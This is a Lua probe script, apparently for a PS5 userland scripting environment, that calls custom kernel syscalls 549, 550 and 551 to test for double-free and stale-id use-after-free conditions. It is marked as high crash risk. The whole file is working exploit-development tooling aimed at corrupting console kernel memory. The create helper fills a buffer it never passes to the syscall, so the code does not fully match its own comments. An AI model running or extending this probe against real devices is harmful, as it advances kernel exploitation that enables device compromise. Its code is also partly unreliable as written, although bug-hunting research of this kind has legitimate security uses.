-- CRASH_CLASS: HIGH
-- PROBE 804a: the 549 create / 550 delete lifecycle, and whether a stale id can name a live object
--
-- 549(arg1=0x20 user bytes, arg2 flags, arg3, arg4 count) mallocs 0x60, initialises it from the
-- user buffer and registers an id; 550 (narg 1) looks an id up, removes the entry and frees twice.
-- If 550 has no generation or state check, a stale id can delete a newer object in the same slot,
-- or the same id can be deleted twice.
print("=== PROBE 804a: 549/550 OBJECT LIFECYCLE ===")
print("")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wrb(a, v) return pcall(function() memory.write_byte(a, v) end) end
local function cstr(s)
    local b = memory.alloc(#s + 1)
    for i = 1, #s do wrb(b + i - 1, s:byte(i)) end
    wrb(b + #s, 0)
    return b
end
local getpid = make_syscall(20)
local sc549 = make_syscall(549)
local sc550 = make_syscall(550)
local sc551 = make_syscall(551)
pcall(function() return getpid() end)
local name = cstr("ps5probe")
local buf = memory.alloc(0x40)
for i = 0, 0x3f, 4 do wd(buf + i, 0) end
local function create(label, tag)
    for i = 0, 0x1f, 4 do wd(buf + i, 0x41410000 + tag + i) end
    local ok, rv = pcall(function()
        return sc549(uint64(name), uint64(0), uint64(0), uint64(1))
    end)
    if not ok then return "pcall-fail" end
    return to_num(rv)
end
local function del(id, sys)
    local sc = sys == 551 and sc551 or sc550
    local ok, rv = pcall(function() return sc(uint64(id)) end)
    if not ok then return "pcall-fail" end
    return to_num(rv)
end
print("[A] create two objects")
local a = create("a", 1)
print("  id1 = " .. tostring(a))
local b = create("b", 2)
print("  id2 = " .. tostring(b))
print("")
print("[B] delete id1 twice")
print("  550(id1) = " .. tostring(del(a, 550)))
print("  550(id1) = " .. tostring(del(a, 550)))
print("")
print("[C] stale id against a live object")
local c = create("c", 3)
print("  id3 = " .. tostring(c))
if type(a) == "number" and type(c) == "number" and a ~= c then
    print("  550(stale id1) = " .. tostring(del(a, 550)))
end
print("  550(id3) = " .. tostring(del(c, 550)))
print("  550(id2) = " .. tostring(del(b, 550)))
print("")
print("[D] 551 on a fresh object")
local d = create("d", 4)
print("  id4 = " .. tostring(d) .. " 551(id4) = " .. tostring(del(d, 551)))
print("  550(id4) = " .. tostring(del(d, 550)))
print("")
print("[E] alive pid=" .. to_num(getpid()))
